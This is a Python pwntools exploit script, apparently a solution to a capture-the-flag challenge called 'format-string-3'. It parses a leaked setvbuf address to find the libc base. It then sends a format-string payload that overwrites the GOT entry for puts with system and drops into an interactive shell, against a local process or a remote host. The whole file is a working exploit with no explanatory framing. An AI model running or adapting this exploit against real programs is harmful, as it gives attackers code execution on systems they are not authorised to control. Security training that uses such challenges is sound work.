from pwn import (
    args,
    fmtstr_payload,
    gdb,
    remote,
    process,
    p64,
    u64,
    flat,
    ROP,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./format-string-3"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
# context.terminal = "kitty"

io = start()
libc = ELF("./libc.so.6")
offset = 38

io.recvuntil(b"libc: ")
setvbuf_infoleak = int(io.recvline().strip()[2:], 16)
libc.address = setvbuf_infoleak - libc.sym.setvbuf
log.info(f"setvbuf_infoleak: {hex(setvbuf_infoleak)}")
log.info(f"libc address: {hex(libc.address)}")

payload = fmtstr_payload(offset, {elf.got.puts: libc.sym["system"]})

io.sendline(payload)

io.interactive()
